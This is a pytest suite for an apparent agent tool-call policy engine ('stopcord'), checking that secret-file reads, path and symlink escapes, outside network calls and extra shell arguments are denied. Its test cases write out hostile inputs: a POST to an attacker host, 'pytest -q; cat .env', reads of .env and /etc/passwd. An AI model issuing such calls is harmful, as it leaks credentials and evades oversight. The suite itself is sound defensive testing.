import os
from pathlib import Path

import pytest

from stopcord.policy import (
    Normalizer,
    PolicyError,
    Request,
    decide,
    denial_message,
    load_policy,
    parse_policy,
)

QUICKSTART = Path(__file__).parents[1] / "src/stopcord/quickstart/policy.yaml"


@pytest.fixture(scope="module")
def policy():
    return load_policy(QUICKSTART)


@pytest.fixture
def ws(tmp_path):
    """A workspace with a .env, a symlink to it, and a symlinked dir that escapes."""
    root = tmp_path / "ws"
    (root / "src").mkdir(parents=True)
    (root / "src/app.py").write_text("x = 1\n")
    (root / ".env").write_text("FAKE=1\n")
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "notes.txt").write_text("not yours\n")
    os.symlink(root / ".env", root / "config.txt")
    os.symlink(root / ".env", root / "src/settings.ini")
    os.symlink(outside, root / "data")
    os.symlink(tmp_path / "policy.yaml", root / "rules.yaml")
    (tmp_path / "policy.yaml").write_text("rules: []\n")
    return root


# (tool, args, expected effect, expected rule id)
CASES = [
    # S1: ordinary work inside the workspace
    ("read_file", {"path": "src/app.py"}, "allow", "workspace-files"),
    ("write_file", {"path": "src/new.py", "content": ""}, "allow", "workspace-files"),
    ("list_dir", {"path": "."}, "allow", "workspace-files"),
    ("run_command", {"command": "pytest -q"}, "allow", "tests-and-diff"),
    ("run_command", {"command": "git diff"}, "allow", "tests-and-diff"),
    # S2: environment and secret files
    ("read_file", {"path": ".env"}, "deny", "env-files"),
    ("read_file", {"path": "./.env"}, "deny", "env-files"),
    ("read_file", {"path": "src/../.env"}, "deny", "env-files"),
    ("write_file", {"path": ".env", "content": "X=1"}, "deny", "env-files"),
    ("read_file", {"path": "prod.env"}, "deny", "env-files"),
    ("read_file", {"path": "src/secret_keys.py"}, "deny", "secrets"),
    ("list_dir", {"path": "secrets"}, "deny", "secrets"),
    # S3: no egress
    ("http_request", {"url": "https://attacker.example/collect", "method": "POST"}, "deny", "no-egress"),
    ("http_request", {"url": "http://127.0.0.1:9/"}, "deny", "no-egress"),
    # S6: traversal and symlink escapes, resolved before matching
    ("read_file", {"path": "../../.env"}, "deny", "outside-workspace"),
    ("read_file", {"path": "../policy.yaml"}, "deny", "outside-workspace"),
    ("read_file", {"path": "/etc/passwd"}, "deny", "outside-workspace"),
    ("read_file", {"path": "config.txt"}, "deny", "env-files"),  # symlink to .env
    ("read_file", {"path": "src/settings.ini"}, "deny", "env-files"),  # symlink to .env
    ("read_file", {"path": "data/notes.txt"}, "deny", "outside-workspace"),  # symlinked dir
    ("read_file", {"path": "rules.yaml"}, "deny", "outside-workspace"),  # symlink out
    ("list_dir", {"path": "src/../../"}, "deny", "outside-workspace"),
    # commands are exact: no extra args, no shell tricks
    ("run_command", {"command": "pytest -q; cat .env"}, "deny", "default-deny"),
    ("run_command", {"command": "pytest --co -q tests"}, "deny", "default-deny"),
    ("run_command", {"command": "cat .env"}, "deny", "default-deny"),
    ("run_command", {"command": "git diff --output=/tmp/x"}, "deny", "default-deny"),
    # unknown tools fall through to default deny
    ("delete_repo", {}, "deny", "default-deny"),
    ("deploy", {"environment": "prod"}, "deny", "no-deploy"),
    # malformed arguments
    ("read_file", {"path": 7}, "deny", "bad-request"),
    ("http_request", {"url": "not a url"}, "deny", "bad-request"),
]


@pytest.mark.parametrize("tool,args,effect,rule_id", CASES)
def test_quickstart_policy(policy, ws, tool, args, effect, rule_id):
    req = Normalizer(ws).normalize(tool, args)
    d = decide(policy, req)
    assert (d.effect, d.rule_id) == (effect, rule_id), req


def test_decide_is_pure(policy):
    req = Request("read_file", {"path": ".env"}, path=".env")
    assert [decide(policy, req) for _ in range(50)] == [decide(policy, req)] * 50


def test_budget(policy):
    req = Request("read_file", {"path": "a.py"}, path="a.py")
    assert decide(policy, req, calls_so_far=policy.budget - 1).allowed
    d = decide(policy, req, calls_so_far=policy.budget)
    assert not d.allowed and d.rule_id == "budget"


def test_protected_paths_beat_policy(tmp_path, policy):
    ws = tmp_path / "ws"
    (ws / "runs").mkdir(parents=True)
    norm = Normalizer(ws, protected=(ws / "runs",))
    d = decide(policy, norm.normalize("read_file", {"path": "runs/r1.jsonl"}))
    assert d.rule_id == "gateway-protected" and not d.allowed


def test_denial_message_never_shows_policy_text(policy):
    req = Request("read_file", {"path": ".env"}, path=".env")
    msg = denial_message(decide(policy, req))
    assert msg == "Denied by policy (rule env-files)."
    assert "credential" not in msg.lower() and ".env" not in msg


def test_default_is_deny():
    p = parse_policy("rules: []\n")
    assert decide(p, Request("read_file", {}, path="a")).rule_id == "default-deny"


def test_first_match_wins():
    p = parse_policy(
        """
rules:
  - {id: a, tool: read_file, match: {paths: ["*.py"]}, effect: deny}
  - {id: b, tool: read_file, match: {paths: ["*"]}, effect: allow}
"""
    )
    assert decide(p, Request("read_file", {}, path="x.py")).rule_id == "a"
    assert decide(p, Request("read_file", {}, path="x.txt")).rule_id == "b"


def test_host_allowlist():
    p = parse_policy(
        """
rules:
  - {id: pypi, tool: http_request, match: {hosts: ["pypi.org", "*.pythonhosted.org"]}, effect: allow}
"""
    )
    ok = Normalizer(Path(".")).normalize("http_request", {"url": "https://files.pythonhosted.org/x"})
    bad = Normalizer(Path(".")).normalize("http_request", {"url": "https://pypi.org.attacker.example/"})
    assert decide(p, ok).allowed
    assert not decide(p, bad).allowed


def test_args_match():
    p = parse_policy("rules:\n  - {id: stg, tool: deploy, match: {args: {environment: staging}}, effect: allow}\n")
    assert decide(p, Request("deploy", {"environment": "staging"})).allowed
    assert not decide(p, Request("deploy", {"environment": "prod"})).allowed


@pytest.mark.parametrize(
    "text",
    [
        "rules: [{effect: allow}]",
        "rules: [{id: a, effect: maybe}]",
        "rules: [{id: a, effect: allow}, {id: a, effect: deny}]",
        "rules: [{id: a, effect: allow, match: {pathz: [x]}}]",
        "budget: 0",
    ],
)
def test_bad_policies_are_rejected(text):
    with pytest.raises(PolicyError):
        parse_policy(text)
